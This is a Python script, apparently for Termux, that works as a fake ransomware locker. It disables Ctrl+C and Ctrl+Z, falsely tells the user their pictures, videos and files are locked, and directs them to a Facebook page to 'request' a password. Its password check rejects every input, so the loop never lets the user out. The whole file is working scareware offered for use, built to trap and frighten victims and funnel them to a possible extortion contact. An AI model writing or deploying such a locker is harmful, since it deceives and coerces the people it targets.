print (""" """)

import os ,sys ,signal      
signal.signal(signal.SIGTSTP, signal.SIG_IGN)
signal.signal(signal.SIGINT, signal.SIG_IGN)
 
red="\033[1;31m"
grn="\033[1;32m"
yel="\033[1;33m"
blue="\033[1;34m"
prple="\033[1;35m"
cyan="\033[1;36m"
res="\033[0m"
      
def logo():
  print(f"""
  {grn}      Your Picture ,Videos or files 
        and termux is {red}Locked🔒
	{grn}If you want to get it back
	Send Message to this Page on Facebook

  {blue}	https://www.facebook.com/Termux-Lock-103516795184086/
        {yel} ____________________________
        |                            |
{yel}	|{red}  a   {prple}Request for Password {yel} |
{yel}	|{red}  b   {prple}Type Password       {yel}  |
{yel}        |____________________________|
  {res}
  """)
  
os.system("clear")
logo()
while 1:
	try:
		test=input(f"{grn}choice {blue}> {yel}")
	except EOFError:
		pass
	
	if test == "a":
		os.system("termux-open-url https://m.facebook.com/Termux-Lock-103516795184086/")
		print("")
		print("")
		print(f"{cyan}   opening facebook page link{res}")
		print("")
		print("")
	
	elif test=='b':
		print("")
		ps=input(f"{yel} Input Password : {grn}")
		print("")
		print(f"{yel}copy the link{grn} or{yel} input letter 'a'{grn} to request password {cyan}")
		print(f"https://m.facebook.com/Termux-Lock-103516795184086/{res}")
		print("")
		print("")
		print(f" {red}invalid password -> {prple}{ps}{res}")
		
	else:
		os.system("clear")
		logo()
		print(f"{red} Invalid Choice {prple}> {red}{test} {res}")
	
  
          
